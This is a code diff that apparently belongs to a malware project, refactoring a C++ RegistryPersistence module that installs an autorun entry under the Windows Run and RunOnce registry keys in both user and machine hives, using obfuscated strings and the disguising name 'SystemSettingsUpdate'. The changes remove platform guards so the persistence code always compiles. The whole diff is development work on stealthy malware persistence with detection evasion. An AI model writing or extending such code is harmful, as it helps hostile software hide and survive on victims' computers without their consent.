@@ -5,6 +5,7 @@
 #include "security/Obfuscation.h"
 #include <string>
 #include <vector>
+#include <windows.h>
 
 // Obfuscated strings
 const auto OBF_REGISTRY_PERSISTENCE = OBFUSCATE("RegistryPersistence");
@@ -13,18 +14,13 @@ const auto OBF_RUNONCE_KEY = OBFUSCATE("Software\\Microsoft\\Windows\\CurrentVer
 const auto OBF_APP_NAME = OBFUSCATE("SystemSettingsUpdate");
 
 RegistryPersistence::RegistryPersistence(Configuration* config)
-    : BasePersistence(config)
-#if PLATFORM_WINDOWS
-    , m_installedHive(NULL)
-#endif
-{}
+    : BasePersistence(config), m_installedHive(NULL) {}
 
 bool RegistryPersistence::Install() {
     if (IsInstalled()) {
         return true;
     }
 
-#if PLATFORM_WINDOWS
     std::vector<HKEY> hives = { HKEY_CURRENT_USER, HKEY_LOCAL_MACHINE };
     std::vector<const char*> keys = { OBFUSCATED_RUN_KEY, OBFUSCATED_RUNONCE_KEY };
 
@@ -43,12 +39,8 @@ bool RegistryPersistence::Install() {
 
     LOG_ERROR("Failed to install registry persistence in any location");
     return false;
-#else
-    return false;
-#endif
 }
 
-#if PLATFORM_WINDOWS
 bool RegistryPersistence::InstallInRegistry(HKEY hive, const char* key) {
     HKEY hKey;
     LONG result = RegOpenKeyExA(hive, key, 0, KEY_WRITE, &hKey);
@@ -77,7 +69,6 @@ bool RegistryPersistence::InstallInRegistry(HKEY hive, const char* key) {
     LOG_DEBUG("Failed to set registry value: " + std::to_string(result));
     return false;
 }
-#endif
 
 bool RegistryPersistence::Remove() {
     if (!m_installed) {
@@ -85,7 +76,6 @@ bool RegistryPersistence::Remove() {
         return true;
     }
 
-#if PLATFORM_WINDOWS
     HKEY hKey;
     LONG result = RegOpenKeyExA(m_installedHive, m_installedKey.c_str(), 0, KEY_WRITE, &hKey);
     if (result != ERROR_SUCCESS) {
@@ -104,13 +94,9 @@ bool RegistryPersistence::Remove() {
 
     LOG_ERROR("Failed to remove registry value: " + std::to_string(result));
     return false;
-#else
-    return false;
-#endif
 }
 
 bool RegistryPersistence::IsInstalled() const {
-#if PLATFORM_WINDOWS
     std::vector<HKEY> hives = { HKEY_CURRENT_USER, HKEY_LOCAL_MACHINE };
     std::vector<const char*> keys = { OBFUSCATED_RUN_KEY, OBFUSCATED_RUNONCE_KEY };
 
@@ -122,12 +108,8 @@ bool RegistryPersistence::IsInstalled() const {
         }
     }
     return false;
-#else
-    return false;
-#endif
 }
 
-#if PLATFORM_WINDOWS
 bool RegistryPersistence::CheckRegistryKey(HKEY hive, const char* key) const {
     HKEY hKey;
     LONG result = RegOpenKeyExA(hive, key, 0, KEY_READ, &hKey);
@@ -154,4 +136,3 @@ bool RegistryPersistence::CheckRegistryKey(HKEY hive, const char* key) const {
 
     return false;
 }
-#endif
